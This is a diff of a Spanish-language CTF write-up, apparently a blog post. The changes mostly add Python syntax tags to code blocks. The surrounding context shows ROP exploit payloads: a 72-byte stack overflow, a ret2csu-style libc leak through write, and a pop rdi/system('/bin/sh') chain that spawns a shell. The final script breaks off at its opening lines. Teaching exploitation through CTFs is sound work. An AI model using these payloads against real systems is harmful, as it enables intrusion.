@@ -40,7 +40,7 @@ Podemos observar que somos capaces usar un pop al registro R14 en la dirección 
 
 Para que esto funcione debemos primero agregar los registros necesarios en nuestro “ropchain” de tal manera que pase el check en 0x4011c4 y hacer que el call, llame a write directamente por lo cual debemos asegurarnos que el valor de write este en  0x4011b9 call   QWORD PTR [ r15+rbx*8 ] 
 
-```
+```python
 payload = b"A"*0x48 #overflow a los 72 bytes
 payload += p64(0x4011ca) #pop a registros
 payload += p64(0)#rbx
@@ -66,13 +66,12 @@ Con esto podemos buscar una versión de libc remota que coincida y de esa forma 
 
 Vemos que coincide con la versión, la 2.31 , podríamos descargarla pero dado que esta pagina nos entrega los offset a system y al string de "/bin/sh" dentro de glibc, pues probaremos con esto en nuestro segundo payload, de la siguiente forma:
 
-```
+```python
 payload = b"A" * 72 #overflow
 payload += p64(poprdi) #pop rdi en el binario
 payload += p64(libc.address+0x1b75aa) #string de /bin/sh a RDI como primer arg
 payload += p64(ret) #ret para alinear el stack a 16 bytes (ubuntu)
 payload += p64(libc.address+0x055410) #direccion de system
-
 ```
 Con esto ejecutamos y listo! Tenemos una shell.
 
@@ -80,7 +79,7 @@ Con esto ejecutamos y listo! Tenemos una shell.
 
 Espero que les haya gustado, este fue el único exploit que pude terminar en el CTF tuve mucho que hacer y los retos no estaban tan fáciles. Aun asi ya he hechos desafíos para Q4 que ocupan esta técnica, por lo cual me pareció valido mostrar como funciona. Espero les haya gustado, aca les dejo el exploit final:
 
-```
+```python
 #!/usr/bin/python3
 from pwn import *
 gs = '''
